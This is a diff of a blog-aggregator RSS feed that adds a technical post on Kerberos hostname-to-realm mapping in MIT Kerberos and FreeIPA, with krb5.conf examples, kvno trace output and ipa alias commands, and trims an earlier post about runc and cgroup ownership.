-&lt;li&gt;&lt;p&gt;Update the container runtime (&lt;code&gt;runc&lt;/code&gt;) to &lt;code&gt;chown&lt;/code&gt; the cgroup &lt;em&gt;after
-systemd creates it&lt;/em&gt;. In fact, this is what &lt;code&gt;systemd-nspawn&lt;/code&gt; does.
-This approach is nice because the only component to change is
-&lt;code&gt;runc&lt;/code&gt;—which had to change anyway, to add the logic to determine
-the cgroup owner UID. To the best of my knowledge, on OpenShift
-&lt;code&gt;runc&lt;/code&gt; gets executed as &lt;code&gt;root&lt;/code&gt; (on the node), so it should have
-the permissions required to do this. Unless SELinux prevents it.&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Of these three options, modifying &lt;code&gt;runc&lt;/code&gt; to &lt;code&gt;chown&lt;/code&gt; the cgroup
-directory seems the most promising. While I wait for feedback on
-&lt;a href=&quot;https://github.com/systemd/systemd/issues/19781&quot;&gt;systemd#19781&lt;/a&gt;, I will start hacking on &lt;code&gt;runc&lt;/code&gt; and testing my
-modifications.&lt;/p&gt;</description>
-	<pubDate>Wed, 09 Jun 2021 00:00:00 +0000</pubDate>
-</item>
-<item>
 	<title>Adam Young: Dealing with reused Serial Numbers for CAs</title>
 	<guid>http://adam.younglogic.com/?p=6968</guid>
 	<link>http://adam.younglogic.com/2020/08/dealing-with-reused-serial-numbers-for-cas/</link>
@@ -2819,11 +3189,349 @@ certutil  -d . -D -n &quot;Certificate Authority - HOME.YOUNGLOGIC.NET
 	<pubDate>Thu, 27 Aug 2020 18:03:51 +0000</pubDate>
 </item>
 <item>
+	<title>Alexander Bokovoy: Lost in (Kerberos) service translation?</title>
+	<guid>https://vda.li/en/posts/2019/03/24/Kerberos-host-to-realm-translation/</guid>
+	<link>https://vda.li/en/posts/2019/03/24/Kerberos-host-to-realm-translation/</link>
+	<description>&lt;p&gt;A year ago Brian J. Atkisson from Red Hat IT filed &lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=1561584&quot;&gt;a bug&lt;/a&gt; against FreeIPA asking to remove a default &lt;code&gt;[domain_realm]&lt;/code&gt; mapping section from the &lt;code&gt;krb5.conf&lt;/code&gt; configuration file generated during installation of a FreeIPA client. The bug is still open and I’d like to use this opportunity to discuss some less known aspects of a Kerberos service principal resolution.&lt;/p&gt;
+
+&lt;p&gt;When an application uses Kerberos to authenticate to a remote service, it needs to talk to a Kerberos key distribution center (KDC) to obtain a service ticket to that remote service. There are multiple ways how an application could construct a name of a service but in a simplistic view it boils down to getting a remote service host name and attaching it to a remote service type name. Type names are customary and really depend on an established tradition for a protocol in use. For example, browsers universally assume that a component &lt;code&gt;HTTP/&lt;/code&gt; is used in the service name; to authenticate to &lt;code&gt;www.example.com&lt;/code&gt; server they would ask a KDC a service ticket to &lt;code&gt;HTTP/www.example.com&lt;/code&gt; principal. When an LDAP client talks to an LDAP server &lt;code&gt;ldap.example.com&lt;/code&gt; and uses SASL GSSAPI authentication, it will ask KDC for a service ticket to &lt;code&gt;ldap/ldap.example.com&lt;/code&gt;. Sometimes these assumptions are written down in a corresponding RFC document, sometimes not, but they assume both client and server know what they are doing.&lt;/p&gt;
+
+&lt;p&gt;There are, however, few more moving parts at play. A host name part of a service principal might come from an interaction with a user. For browser, this would be a server name from a URL entered by a user and browser would need to construct the target service principal from it. The host name part might be incomplete in some cases: if you only have a single DNS domain in use, server names would be unique in that domain and your users might find it handy to only use the first label of a DNS name of the server to address it. Such approach was certainly very popular among system administrators who relied on capabilities of a Kerberos library to expand the short name into a fully qualified one.&lt;/p&gt;
+
+&lt;p&gt;Let’s look into that. Kerberos configuration file, &lt;code&gt;krb5.conf&lt;/code&gt;, allows to say for any application that a hostname passed down to the library would need to be canonicalized. This option, &lt;code&gt;dns_canonicalize_hostname&lt;/code&gt;, allows us to say “I want to connect to a server &lt;code&gt;bastion&lt;/code&gt;” and let libkrb5 to expand that one to a &lt;code&gt;bastion.example.com&lt;/code&gt; host name. While this behavior is handy, it relies on DNS. A downside of disabling canonicalization of the hostnames is that short hostnames will not be canonicalized and upon requests to KDC might be not recognized. Finally, there is a possibility of DNS hijacking. For Kerberos, use cases when DNS responses are spoofed aren’t too problematic since the fake KDC or the fake service wouldn’t gain much knowledge, but even in a normal situation a latency of DNS responses might be a considerable problem.&lt;/p&gt;
+
+&lt;p&gt;Another part of the equation is to find out which Kerberos realm a specified target service principal belongs to. If you have a single Kerberos realm, it might not be an issue; by setting &lt;code&gt;default_realm&lt;/code&gt; option in the &lt;code&gt;krb5.conf&lt;/code&gt; we can make sure a client always assumes the only realm we have. However, if there are multiple Kerberos realms, it is important to map the target service principal to the target realm at a client side, before a request is issued to a KDC.&lt;/p&gt;
+
+&lt;p&gt;There might be multiple Kerberos realms in existence at any site. For example, FreeIPA deployment provides one. If FreeIPA has established a trust to an Active Directory forest, then that forest would represent another Kerberos realm. Potentially, even more than one as each Active Directory domain in an Active Directory forest is a separate Kerberos realm in itself.&lt;/p&gt;
+
+&lt;p&gt;Kerberos protocol defines that a realm in which the application server is located must be determined by the client (&lt;a href=&quot;https://tools.ietf.org/html/rfc4120#section-3.3.1&quot;&gt;RFC 4120 section 3.3.1&lt;/a&gt;). The specification also defines several strategies how a client may map the hostname of the application server to the realm it believes the server belongs to.&lt;/p&gt;
+
+&lt;h2 id=&quot;domain-to-realm-mapping&quot;&gt;Domain to realm mapping&lt;/h2&gt;
+
+&lt;p&gt;Let us stop and think a bit at this point. A Kerberos client has full control over the decision process of to which realm a particular application server belongs to. If it decides that the application server is from a different realm than the client is itself, then it needs to ask for a cross-realm ticket granting ticket from its own KDC. Then, with the cross-realm TGT in possession, the client can ask a KDC of the application server’s realm for the actual service ticket.&lt;/p&gt;
+
+&lt;p&gt;As a client, we want to be sure we would be talking to the correct KDC. As mentioned earlier, overly relying on DNS is not always a particulary secure action. As a result, &lt;code&gt;krb5&lt;/code&gt; library provides a way to consider how a particular hostname is mapped to a realm. The search mechanism for a realm mapping is pluggable and by default includes:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;registry-based search on WIN32 (does nothing for Linux)&lt;/li&gt;
+  &lt;li&gt;profile-based search: uses &lt;code&gt;[domain_realm]&lt;/code&gt; section in &lt;code&gt;krb5.conf&lt;/code&gt; to do actual mapping&lt;/li&gt;
+  &lt;li&gt;dns-based search that can be disabled with &lt;code&gt;dns_lookup_realm = false&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;domain-based search: it is disabled by default and can be enabled with
+&lt;code&gt;realm_try_domains = ...&lt;/code&gt; option in &lt;code&gt;krb5.conf&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The order of search is important. It is hard-coded in &lt;code&gt;krb5&lt;/code&gt; library and depends on what operation is performed. For realm selection it is hard-coded that profile-based search is done before DNS-based search and domain-based
+search is done as the last one.&lt;/p&gt;
+
+&lt;h3 id=&quot;profile-based-search&quot;&gt;Profile-based search&lt;/h3&gt;
+
+&lt;p&gt;When &lt;code&gt;[domain_realm]&lt;/code&gt; section exists in &lt;code&gt;krb5.conf&lt;/code&gt;, it will be used to map a hostname of the application server to a realm. The mapping table in this section is typically build up based on the host and domain maps:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[domain_realm]
+   www.example.com = EXAMPLE.COM
+   .dev.example.com = DEVEXAMPLE.COM
+   .example.com = EXAMPLE.COM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The mapping above says that &lt;code&gt;www.example.com&lt;/code&gt; would be explicitly mapped to &lt;code&gt;EXAMPLE.COM&lt;/code&gt; realm, all machines in DNS zone &lt;code&gt;dev.example.com&lt;/code&gt; would be mapped to &lt;code&gt;DEVEXAMPLE.COM&lt;/code&gt; realm and the rest of hosts in DNS zone &lt;code&gt;example.com&lt;/code&gt; would be mapped to &lt;code&gt;EXAMPLE.COM&lt;/code&gt;. This mapping only applies to hostnames, so a hostname &lt;code&gt;foo.bar.example.com&lt;/code&gt; would not be mapped by this schema to any realm.&lt;/p&gt;
+
+&lt;p&gt;Profile-based search is visible in the Kerberos trace output as a selection of the realm right at the beginning of a request for a service ticket to a host-based service principal:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@client ~]# kinit -k
+[root@client ~]# KRB5_TRACE=/dev/stderr kvno -S cifs client.example.com
+[30798] 1552847822.721561: Getting credentials host/client.example.com@EXAMPLE.COM -&amp;gt; cifs/client.example.com@EXAMPLE.COM using ccache KEYRING:persistent:0:0
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The difference here is that for a service principal not mapped with profile-based search there will be no assumed realm and the target principal would be constructed without a realm:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@client ~]# kinit -k
+[root@client ~]# KRB5_TRACE=/dev/stderr kvno -S ldap dc.ad.example.com
+[30684] 1552841274.602324: Getting credentials host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@ using ccache KEYRING:persistent:0:0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;dns-based-search&quot;&gt;DNS-based search&lt;/h3&gt;
+
+&lt;p&gt;DNS-based search is activated when &lt;code&gt;dns_lookup_realm&lt;/code&gt; option is set to &lt;code&gt;true&lt;/code&gt; in &lt;code&gt;krb5.conf&lt;/code&gt; and profile-based search did not return any results. Kerberos library will do a number of DNS queries for a TXT record starting with &lt;code&gt;_kerberos&lt;/code&gt;. It will help it to discover which Kerberos realm is responsible for the DNS host of the application server. Kerberos library will perform these searches for the hostname itself first and then for each domain component in the hostname until it finds an answer or processes all domain components.&lt;/p&gt;
+
+&lt;p&gt;If we have &lt;code&gt;www.example.com&lt;/code&gt; as a hostname, then Kerberos library would issue a DNS query for TXT record &lt;code&gt;_kerberos.www.example.com&lt;/code&gt; to find a name of the Kerberos realm of &lt;code&gt;www.example.com&lt;/code&gt;. If that fails, next try will be for a TXT record &lt;code&gt;_kerberos.example.com&lt;/code&gt; and so on, until DNS components are all processed.&lt;/p&gt;
+
+&lt;p&gt;It should be noted that this algorithm is only implemented in MIT and Heimdal Kerberos libraries. Active Directory implementation from Microsoft does not allow to query &lt;code&gt;_kerberos.$hostname&lt;/code&gt; DNS TXT record to find out which realm a target application server belongs to. Instead, Windows environments delegate the discovery process to their domain controllers.&lt;/p&gt;
+
+&lt;p&gt;DNS canonicalization feature (or lack of) also affects DNS search since without it we wouldn’t know what realm to map to a non-fully qualified hostname. When &lt;code&gt;dns_canonicalize_hostname&lt;/code&gt; option is set to &lt;code&gt;false&lt;/code&gt;, Kerberos client would send the request to KDC with a default realm associated with the non-fully qualified hostname. Most likely such service principal wouldn’t be understood by the KDC and reported as not found.&lt;/p&gt;
+
+&lt;p&gt;To help in this situations, FreeIPA KDC supports Kerberos principal aliases. One can use the following &lt;code&gt;ipa&lt;/code&gt; command line tool’s command to add aliases to hosts. Remember that a host principal is really a &lt;code&gt;host/&amp;lt;hostname&amp;gt;&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ipa help host-add-principal
+Usage: ipa [global-options] host-add-principal HOSTNAME KRBPRINCIPALNAME... [options]
+
+Add new principal alias to host entry
+Options:
+  -h, --help    show this help message and exit
+  --all         Retrieve and print all attributes from the server. Affects
+                command output.
+  --raw         Print entries as stored on the server. Only affects output
+                format.
+  --no-members  Suppress processing of membership attributes.
+
+$ ipa host-add-principal bastion.example.com host/bastion
+-------------------------------------------
+Added new aliases to host &quot;bastion.example.com&quot;
+-------------------------------------------
+  Host name: bastion.example.com
+  Principal alias: host/bastion.example.com@EXAMPLE.COM, host/bastion@EXAMPLE.COM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and for other Kerberos service principals the corresponding command is &lt;code&gt;ipa service-add-principal&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ipa help service-add-principal
+Usage: ipa [global-options] service-add-principal CANONICAL-PRINCIPAL PRINCIPAL... [options]
+
+Add new principal alias to a service
+Options:
+  -h, --help    show this help message and exit
+  --all         Retrieve and print all attributes from the server. Affects
+                command output.
+  --raw         Print entries as stored on the server. Only affects output
+                format.
+  --no-members  Suppress processing of membership attributes.
+
+$ ipa service-show HTTP/bastion.example.com
+  Principal name: HTTP/bastion.example.com@EXAMPLE.COM
+  Principal alias: HTTP/bastion.example.com@EXAMPLE.COM
+  Keytab: False
+  Managed by: bastion.example.com
+  Groups allowed to create keytab: admins
+[root@nyx ~]# ipa service-add-principal HTTP/bastion.example.com HTTP/bastion
+---------------------------------------------------------------------------------
+Added new aliases to the service principal &quot;HTTP/bastion.example.com@EXAMPLE.COM&quot;
+---------------------------------------------------------------------------------
+  Principal name: HTTP/bastion.example.com@EXAMPLE.COM
+  Principal alias: HTTP/bastion.example.com@EXAMPLE.COM, HTTP/bastion@EXAMPLE.COM
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;domain-based-search&quot;&gt;Domain-based search&lt;/h3&gt;
+
+&lt;p&gt;Finally, domain-based search is activated when &lt;code&gt;realm_try_domains = ...&lt;/code&gt; is specified. In this case Kerberos library will try heuristics based on the hostname of the target application server and a specific number of domain components of the application server hostname depending on how many components &lt;code&gt;realm_try_domains&lt;/code&gt; option is allowing to cut off. More about that later.&lt;/p&gt;
+
+&lt;h3 id=&quot;kdc-based-hostname-search&quot;&gt;KDC-based hostname search&lt;/h3&gt;
+
+&lt;p&gt;However, there is another option employed by MIT Kerberos library. In case when MIT Kerberos client is unable to find out a realm on its own, starting with MIT krb5 1.6 version, a client will issue a request for without a known realm to own KDC. A KDC (must be MIT krb5 1.7 or later) can opt to recognize the hostname against own &lt;code&gt;[domain_realm]&lt;/code&gt; mapping table and choose to issue a referral to the appropriate service realm.&lt;/p&gt;
+
+&lt;p&gt;The latter approach would only work if the KDC has been configured to allow such referrals to be issued and if client is asking for a host-based service. FreeIPA KDC, by default, allows this behavior. For trusted Active Directory realms there is also a support from SSSD on IPA masters: SSSD generates automatically &lt;code&gt;[domain_realm]&lt;/code&gt; and &lt;code&gt;[capaths]&lt;/code&gt; sections for all known trusted realms so that KDC is able to respond with the referrals.&lt;/p&gt;
+
+&lt;p&gt;However, a care should be taken by an application itself on the client side when constructing such Kerberos principal. For example, if we would use &lt;code&gt;kvno&lt;/code&gt; utility, then a request &lt;code&gt;kvno -S service hostname&lt;/code&gt; would ask for a referral while &lt;code&gt;kvno service/hostname&lt;/code&gt; would not. The former is constructing a host-based principal while the latter is not.&lt;/p&gt;
+
+&lt;p&gt;When looking at the Kerberos trace, we can see the difference. Below &lt;code&gt;host/client.example.com&lt;/code&gt; is asking for a service ticket to &lt;code&gt;ldap/dc.ad.example.com&lt;/code&gt; as a host-based principal, without knowing which realm the application server’s principal belongs to:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@client ~]# kinit -k
+[root@client ~]# KRB5_TRACE=/dev/stderr kvno -S ldap dc.ad.example.com
+[30684] 1552841274.602324: Getting credentials host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@ using ccache KEYRING:persistent:0:0
+[30684] 1552841274.602325: Retrieving host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@ from KEYRING:persistent:0:0 with result: -1765328243/Matching credential not found
+[30684] 1552841274.602326: Retrying host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@EXAMPLE.COM with result: -1765328243/Matching credential not found
+[30684] 1552841274.602327: Server has referral realm; starting with ldap/dc.ad.example.com@EXAMPLE.COM
+[30684] 1552841274.602328: Retrieving host/client.example.com@EXAMPLE.COM -&amp;gt; krbtgt/EXAMPLE.COM@EXAMPLE.COM from KEYRING:persistent:0:0 with result: 0/Success
+[30684] 1552841274.602329: Starting with TGT for client realm: host/client.example.com@EXAMPLE.COM -&amp;gt; krbtgt/EXAMPLE.COM@EXAMPLE.COM
+[30684] 1552841274.602330: Requesting tickets for ldap/dc.ad.example.com@EXAMPLE.COM, referrals on
+[30684] 1552841274.602331: Generated subkey for TGS request: aes256-cts/A93C
+[30684] 1552841274.602332: etypes requested in TGS request: aes256-cts, aes128-cts, aes256-sha2, aes128-sha2, des3-cbc-sha1, rc4-hmac, camellia128-cts, camellia256-cts
+[30684] 1552841274.602334: Encoding request body and padata into FAST request
+[30684] 1552841274.602335: Sending request (965 bytes) to EXAMPLE.COM
+[30684] 1552841274.602336: Initiating TCP connection to stream ip.ad.dr.ess:88
+[30684] 1552841274.602337: Sending TCP request to stream ip.ad.dr.ess:88
+[30684] 1552841274.602338: Received answer (856 bytes) from stream ip.ad.dr.ess:88
+[30684] 1552841274.602339: Terminating TCP connection to stream ip.ad.dr.ess:88
+[30684] 1552841274.602340: Response was from master KDC
+[30684] 1552841274.602341: Decoding FAST response
+[30684] 1552841274.602342: FAST reply key: aes256-cts/D1E2
+[30684] 1552841274.602343: Reply server krbtgt/AD.EXAMPLE.COM@EXAMPLE.COM differs from requested ldap/dc.ad.example.com@EXAMPLE.COM
+[30684] 1552841274.602344: TGS reply is for host/client.example.com@EXAMPLE.COM -&amp;gt; krbtgt/AD.EXAMPLE.COM@EXAMPLE.COM with session key aes256-cts/470F
+[30684] 1552841274.602345: TGS request result: 0/Success
+[30684] 1552841274.602346: Following referral TGT krbtgt/AD.EXAMPLE.COM@EXAMPLE.COM
+[30684] 1552841274.602347: Requesting tickets for ldap/dc.ad.example.com@AD.EXAMPLE.COM, referrals on
+[30684] 1552841274.602348: Generated subkey for TGS request: aes256-cts/F0C6
+[30684] 1552841274.602349: etypes requested in TGS request: aes256-cts, aes128-cts, aes256-sha2, aes128-sha2, des3-cbc-sha1, rc4-hmac, camellia128-cts, camellia256-cts
+[30684] 1552841274.602351: Encoding request body and padata into FAST request
+[30684] 1552841274.602352: Sending request (921 bytes) to AD.EXAMPLE.COM
+[30684] 1552841274.602353: Sending DNS URI query for _kerberos.AD.EXAMPLE.COM.
+[30684] 1552841274.602354: No URI records found
+[30684] 1552841274.602355: Sending DNS SRV query for _kerberos._udp.AD.EXAMPLE.COM.
+[30684] 1552841274.602356: SRV answer: 0 0 88 &quot;dc.ad.example.com.&quot;
+[30684] 1552841274.602357: Sending DNS SRV query for _kerberos._tcp.AD.EXAMPLE.COM.
+[30684] 1552841274.602358: SRV answer: 0 0 88 &quot;dc.ad.example.com.&quot;
+[30684] 1552841274.602359: Resolving hostname dc.ad.example.com.
+[30684] 1552841274.602360: Resolving hostname dc.ad.example.com.
+[30684] 1552841274.602361: Initiating TCP connection to stream ano.ther.add.ress:88
+[30684] 1552841274.602362: Sending TCP request to stream ano.ther.add.ress:88
+[30684] 1552841274.602363: Received answer (888 bytes) from stream ano.ther.add.ress:88
+[30684] 1552841274.602364: Terminating TCP connection to stream ano.ther.add.ress:88
+[30684] 1552841274.602365: Sending DNS URI query for _kerberos.AD.EXAMPLE.COM.
+[30684] 1552841274.602366: No URI records found
+[30684] 1552841274.602367: Sending DNS SRV query for _kerberos-master._tcp.AD.EXAMPLE.COM.
+[30684] 1552841274.602368: No SRV records found
+[30684] 1552841274.602369: Response was not from master KDC
+[30684] 1552841274.602370: Decoding FAST response
+[30684] 1552841274.602371: FAST reply key: aes256-cts/10DE
+[30684] 1552841274.602372: TGS reply is for host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@AD.EXAMPLE.COM with session key aes256-cts/24D1
+[30684] 1552841274.602373: TGS request result: 0/Success
+[30684] 1552841274.602374: Received creds for desired service ldap/dc.ad.example.com@AD.EXAMPLE.COM
+[30684] 1552841274.602375: Storing host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@ in KEYRING:persistent:0:0
+[30684] 1552841274.602376: Also storing host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@AD.EXAMPLE.COM based on ticket
+[30684] 1552841274.602377: Removing host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@AD.EXAMPLE.COM from KEYRING:persistent:0:0
+ldap/dc.ad.example.com@: kvno = 28
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However, when not using a host-based principal in the request we’ll fail.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@client ~]# kinit -k
+[root@client ~]# KRB5_TRACE=/dev/stderr kvno ldap/dc.ad.example.com
+[30695] 1552841932.100975: Getting credentials host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@EXAMPLE.COM using ccache KEYRING:persistent:0:0
+[30695] 1552841932.100976: Retrieving host/client.example.com@EXAMPLE.COM -&amp;gt; ldap/dc.ad.example.com@EXAMPLE.COM from KEYRING:persistent:0:0 with result: -1765328243/Matching credential not found
+[30695] 1552841932.100977: Retrieving host/client.example.com@EXAMPLE.COM -&amp;gt; krbtgt/EXAMPLE.COM@EXAMPLE.COM from KEYRING:persistent:0:0 with result: 0/Success
+[30695] 1552841932.100978: Starting with TGT for client realm: host/client.example.com@EXAMPLE.COM -&amp;gt; krbtgt/EXAMPLE.COM@EXAMPLE.COM
+[30695] 1552841932.100979: Requesting tickets for ldap/dc.ad.example.com@EXAMPLE.COM, referrals on
+[30695] 1552841932.100980: Generated subkey for TGS request: aes256-cts/27DA
+[30695] 1552841932.100981: etypes requested in TGS request: aes256-cts, aes128-cts, aes256-sha2, aes128-sha2, des3-cbc-sha1, rc4-hmac, camellia128-cts, camellia256-cts
+[30695] 1552841932.100983: Encoding request body and padata into FAST request
+[30695] 1552841932.100984: Sending request (965 bytes) to EXAMPLE.COM
+[30695] 1552841932.100985: Initiating TCP connection to stream ip.ad.dr.ess:88
+[30695] 1552841932.100986: Sending TCP request to stream ip.ad.dr.ess:88
+[30695] 1552841932.100987: Received answer (461 bytes) from stream ip.ad.dr.ess:88
+[30695] 1552841932.100988: Terminating TCP connection to stream ip.ad.dr.ess:88
+[30695] 1552841932.100989: Response was from master KDC
+[30695] 1552841932.100990: Decoding FAST response
+[30695] 1552841932.100991: TGS request result: -1765328377/Server ldap/dc.ad.example.com@EXAMPLE.COM not found in Kerberos database
+[30695] 1552841932.100992: Requesting tickets for ldap/dc.ad.example.com@EXAMPLE.COM, referrals off
+[30695] 1552841932.100993: Generated subkey for TGS request: aes256-cts/C1BF
+[30695] 1552841932.100994: etypes requested in TGS request: aes256-cts, aes128-cts, aes256-sha2, aes128-sha2, des3-cbc-sha1, rc4-hmac, camellia128-cts, camellia256-cts
+[30695] 1552841932.100996: Encoding request body and padata into FAST request
+[30695] 1552841932.100997: Sending request (965 bytes) to EXAMPLE.COM
+[30695] 1552841932.100998: Initiating TCP connection to stream ip.ad.dr.ess:88
+[30695] 1552841932.100999: Sending TCP request to stream ip.ad.dr.ess:88
+[30695] 1552841932.101000: Received answer (461 bytes) from stream ip.ad.dr.ess:88
+[30695] 1552841932.101001: Terminating TCP connection to stream ip.ad.dr.ess:88
+[30695] 1552841932.101002: Response was from master KDC
+[30695] 1552841932.101003: Decoding FAST response
+[30695] 1552841932.101004: TGS request result: -1765328377/Server ldap/dc.ad.example.com@EXAMPLE.COM not found in Kerberos database
+kvno: Server ldap/dc.ad.example.com@EXAMPLE.COM not found in Kerberos database while getting credentials for ldap/dc.ad.example.com@EXAMPLE.COM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see, our client tried to ask for a service ticket to a non-host-based service principal from outside our realm and this was not accepted by the KDC, thus resolution failing.&lt;/p&gt;
+
+&lt;h2 id=&quot;mixed-realm-deployments&quot;&gt;Mixed realm deployments&lt;/h2&gt;
+
+&lt;p&gt;The behavior above is predictable. However, a client-side processing of the target realm behaves wrongly in case a client needs to request a service ticket to a service principal located in a trusted realm but situated in a DNS zone belonging to our own realm. This might sound like a complication but it is a typical situation for deployments with FreeIPA trusting Active Directory forests. In such cases customers often want to place Linux machines right in the DNS zones associated with Active Directory domains.&lt;/p&gt;
+
+&lt;p&gt;Since Microsoft Active Directory implementation does not support per-host Kerberos realm hint, unlike MIT Kerberos or Heimdal, such request from Windows client will always fail. It will be not possible to obtain a service ticket in such situation from Windows machines.&lt;/p&gt;
+
+&lt;p&gt;However, when both realms trusting each other are MIT Kerberos, their KDCs and clients can be configured for a selective realm discovery.&lt;/p&gt;
+
+&lt;p&gt;As explained at &lt;a href=&quot;https://archive.fosdem.org/2018/schedule/event/opensource_idm_in_enterprise/&quot;&gt;FOSDEM 2018&lt;/a&gt; and &lt;a href=&quot;https://devconfcz2019.sched.com/event/JcfK/migrating-a-linux-environment-to-idm&quot;&gt;devconf.cz 2019&lt;/a&gt;, Red Hat IT moved from an old plain Kerberos realm to the FreeIPA deployment.
+This is a situation where we have EXAMPLE.COM and IPA.EXAMPLE.COM both trusting each other and migrating systems to IPA.EXAMPLE.COM over long period of time. We want to continue providing services in example.com DNS zone but use IPA.EXAMPLE.COM realm. Our clients are in both Kerberos realms but over time they will all eventually migrate to IPA.EXAMPLE.COM.&lt;/p&gt;
+
+&lt;p&gt;Working with such situation can be tricky. Let’s start with a simple example.&lt;/p&gt;
+
+&lt;p&gt;Suppose our client’s &lt;code&gt;krb5.conf&lt;/code&gt; has &lt;code&gt;[domain_realm]&lt;/code&gt; section that looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[domain_realm]
+   client.example.com = EXAMPLE.COM
+   .example.com = EXAMPLE.COM
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we need to ask for a &lt;code&gt;HTTP/app.example.com&lt;/code&gt; service ticket to the application server hosted on &lt;code&gt;app.example.com&lt;/code&gt;, the Kerberos library on the client will map &lt;code&gt;HTTP/app.example.com&lt;/code&gt; to the &lt;code&gt;EXAMPLE.COM&lt;/code&gt; and will not attempt to request a referral from a KDC. If our application server is enrolled into &lt;code&gt;IPA.EXAMPLE.COM&lt;/code&gt; realm, it means the client with such configuration will never try to discover &lt;code&gt;HTTP/app.example.com@IPA.EXAMPLE.COM&lt;/code&gt; and will never be able to authenticate to &lt;code&gt;app.example.com&lt;/code&gt; with Kerberos.&lt;/p&gt;
+
+&lt;p&gt;There are two possible solutions here. We can either add an explicit mapping for &lt;code&gt;app.example.com&lt;/code&gt; host to &lt;code&gt;IPA.EXAMPLE.COM&lt;/code&gt; in the client’s &lt;code&gt;[domain_realm]&lt;/code&gt; section in &lt;code&gt;krb5.conf&lt;/code&gt; or remove &lt;code&gt;.example.com&lt;/code&gt; mapping entry from the &lt;code&gt;[domain_realm]&lt;/code&gt; on the client side completely and rely on KDC or DNS-based search.&lt;/p&gt;
+
+&lt;p&gt;First solution does not scale and is a management issue. Updating all clients when a new application server is migrated to the new realm sounds like a nightmare if majority of your clients are laptops. You’d really want to force them to delegate to the KDC or do DNS-based search instead.&lt;/p&gt;
+
+&lt;p&gt;Of course, there is a simple solution: add &lt;code&gt;_kerberos.app.example.com&lt;/code&gt; TXT record pointing out to &lt;code&gt;IPA.EXAMPLE.COM&lt;/code&gt; in the DNS and let clients to use it. This would assume that all clients will not have &lt;code&gt;.example.com = EXAMPLE.COM&lt;/code&gt; mapping rule.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, it is more complicated. As Robbie Harwood, Fedora and RHEL maintainer of MIT Kerberos, explained to me, the problem is what happens if there’s inadequate DNS information, e.g. DNS-based search failed. A client would fall back to heuristics (domain-based search) and these would differ depending which MIT Kerberos version is in use. Since MIT Kerberos 1.16 heuristics would be trying to prefer mapping &lt;code&gt;HTTP/app.ipa.example.com&lt;/code&gt; into &lt;code&gt;IPA.EXAMPLE.COM&lt;/code&gt; over &lt;code&gt;EXAMPLE.COM&lt;/code&gt;, and prefer &lt;code&gt;EXAMPLE.COM&lt;/code&gt; to failure. However, there is no a way to map &lt;code&gt;HTTP/app.example.com&lt;/code&gt; to &lt;code&gt;IPA.EXAMPLE.COM&lt;/code&gt; with these heuristics.&lt;/p&gt;
+
+&lt;p&gt;Domain-based search gives us another heuristics based on the realm. It is tunable via &lt;code&gt;realm_try_domains&lt;/code&gt; option but it also would affect the way how MIT Kerberos library would choose which credentials cache from a credentials cache collection (KEYRING:, DIR:, KCM: ccache types). This logic is present since MIT Kerberos 1.12 but it also wouldn’t help us to map &lt;code&gt;HTTP/app.example.com&lt;/code&gt; to &lt;code&gt;IPA.EXAMPLE.COM&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;After some discussions, Robbie and I came to a conclusion that perhaps changing the order how these methods are applied by the MIT Kerberos library could help. As I mentioned in &lt;a href=&quot;https://vda.li/en/freeipa.xml#domain-to-realm-mapping&quot;&gt;“Domain to realm mapping”&lt;/a&gt; section, the current order is hard-coded: for realm selection the profile-based search is done before DNS-based search and domain-based search is done as the last one. Ideally, choosing which search is done after which could be given to administrators. However, there aren’t many reasonable orders out there. Perhaps, allowing just two options would be enough:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;prioritizing DNS search over a profile search&lt;/li&gt;
+  &lt;li&gt;prioritizing a profile search over DNS search&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Until it is done, we are left with the following recommendation for mixed-domain Kerberos principals from multiple realms:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;make sure you don’t use &lt;code&gt;[domain_realm]&lt;/code&gt; mapping for mixed realm domains&lt;/li&gt;
+  &lt;li&gt;make sure you have &lt;code&gt;_kerberos.$hostname&lt;/code&gt; TXT record set per &lt;code&gt;host/domain&lt;/code&gt;
+for the right realm name. Remember that Kerberos realm is case-sensitive and almost everywhere it is uppercase, so be sure the value of the TXT record is correct.&lt;/li&gt;
+&lt;/ul&gt;</description>
+	<pubDate>Sun, 24 Mar 2019 07:13:00 +0000</pubDate>
+</item>
